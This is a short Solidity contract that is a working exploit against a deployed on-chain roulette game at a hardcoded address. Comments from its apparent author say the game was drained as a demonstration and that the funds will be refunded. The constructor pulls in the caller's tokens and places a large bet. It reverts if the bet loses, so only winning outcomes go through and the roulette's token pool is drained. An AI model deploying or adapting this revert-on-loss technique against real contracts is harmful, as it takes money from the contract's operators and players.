// This contract has won the roulette
// Apart from this the wins are incredibly mispriced - 3x win on a 46% probability is way too much
// Even if the house is not supposed to win, this would drain the casino way too fast
// Funds 'won' with this contract will be 100% refunded
// Sincerely yours kriko.eth

// Twitter: https://twitter.com/ShibaWars
// Play Shibawars: https://shibawars.net
// TG: https://t.me/shibawarsportal

pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IRoulette {
    function playRoulette(uint _start, uint _end, uint _tokensBet) external;
}

contract RouletteWinner {
    address token = 0x255f07B5c7f62E2eAec552b1866D089023B05a46;
    address roulette = 0x2e7C1220E4C95e0828b9EeF55E2FC8CF3f1A1795;

    constructor() {
        IRoulette rouletteContract = IRoulette(roulette);
        IERC20 wPunks = IERC20(token);

        uint balanceBefore = wPunks.balanceOf(msg.sender);

        wPunks.transferFrom(msg.sender, address(this), balanceBefore);

        uint stake = wPunks.balanceOf(address(rouletteContract)) / 13;
        wPunks.approve(address(rouletteContract), stake);

        rouletteContract.playRoulette(0, 0, stake);

        require(
            balanceBefore < wPunks.balanceOf(address(this)),
            'Unfortunately did not win'
        );

        wPunks.transfer(msg.sender, wPunks.balanceOf(address(this)));
    }
}
